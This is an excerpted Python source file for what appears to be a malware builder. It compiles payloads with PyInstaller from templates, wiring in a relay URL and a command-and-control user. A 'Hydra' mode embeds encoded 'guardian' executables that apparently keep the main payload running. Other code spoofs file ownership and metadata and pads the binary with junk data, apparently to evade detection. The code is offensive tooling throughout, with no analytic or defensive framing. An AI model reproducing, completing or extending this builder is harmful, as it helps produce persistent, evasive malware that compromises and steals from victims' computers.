...
def simple_log_filter(line, state):
    ...
    log_map = {
        "pyinstaller bootloader": ("[PyInstaller] Starting executable conversion...", "pyinstaller_start"),
        "analyzing hidden import": ("[PyInstaller] Analyzing hidden imports...", "hidden_imports"),
        "including run-time hook": ("[PyInstaller] Including run-time hooks...", "runtime_hooks"),
        "building c archive": ("[Compiler] Compiling support libraries...", "compiling_c"),
        "building exe from": ("[Compiler] Compiling main executable...", "compiling_exe"),
        "appending archive to exe": ("[Bundler] Bundling payload into a single file...", "bundling")
    }
    ...
    if "pyinstaller:" in line_lower and not state.get("pyi_version"):
        state["pyi_version"] = True
        return f"[PyInstaller] v{line_strip.split(':')[-1].strip()}"
    if "python:" in line_lower and not state.get("python_version"):
        state["python_version"] = True
        return f"[Python] v{line_strip.split(':')[-1].strip()}"
        
    if line_strip.startswith('WARN:'):
        return f"[Warning] {line_strip[5:].strip()}"
...
def _spoof_file_metadata(file_path, settings, log_callback):
    ...
    if spoof_settings.get("owner_enabled") and owner_to_set != "Keep Current":
        ...
        try:
            ...
            if e.winerror == 1314:
                 log_callback("[ERROR] Failed to set owner: This operation requires administrative privileges.")
            else:
...
def build_payload(settings, relay_url, c2_user, log_callback, thread_object):
    ...
    if settings.get("hydra"):
        ...
        all_guardian_names.append(main_payload_full_name)

        log_callback("\n[Hydra] Starting pre-build for lightweight guardians...")
        for i, guardian_config in enumerate(guardians_config):
            ...
            encoded_data = _compile_single(
                guardian_full_name, guardian_settings, relay_url, c2_user, 
                log_callback, thread_object, 
                all_guardian_names_for_template=all_guardian_names,
                is_guardian=True
            )
            ...
            embedded_guardians[guardian_full_name] = encoded_data
            log_callback(f"[Hydra] Guardian '{guardian_full_name}' pre-built and encoded.")

    log_callback(f"\n[Builder] Starting final build for main payload: {main_payload_full_name}...")
    
    main_payload_settings = settings.copy()
    main_payload_settings['embedded_guardians'] = embedded_guardians
    
    final_path = _compile_single(
        main_payload_full_name, main_payload_settings, relay_url, c2_user, 
        log_callback, thread_object, 
        all_guardian_names_for_template=all_guardian_names,
        is_guardian=False
    )
...
def _compile_single(payload_full_name, settings, relay_url, c2_user, log_callback, thread_object, all_guardian_names_for_template=None, is_guardian=False):
    with tempfile.TemporaryDirectory() as temp_dir:
        ...
        template_path = "payload/guardian_template.py" if is_guardian else "payload/template.py"
        ...
        hidden_imports = [
            ...
            'winreg', 'shutil', 'sqlite3', 'ctypes', 'socket', 'pefile',
            'cryptography', 'xml.etree.ElementTree'
        ]
        ...
        if process.returncode == 0 and thread_object._is_running:
            ...
            if padding_settings.get("enabled"):
                log_callback("[Builder] Adding junk data to file...")
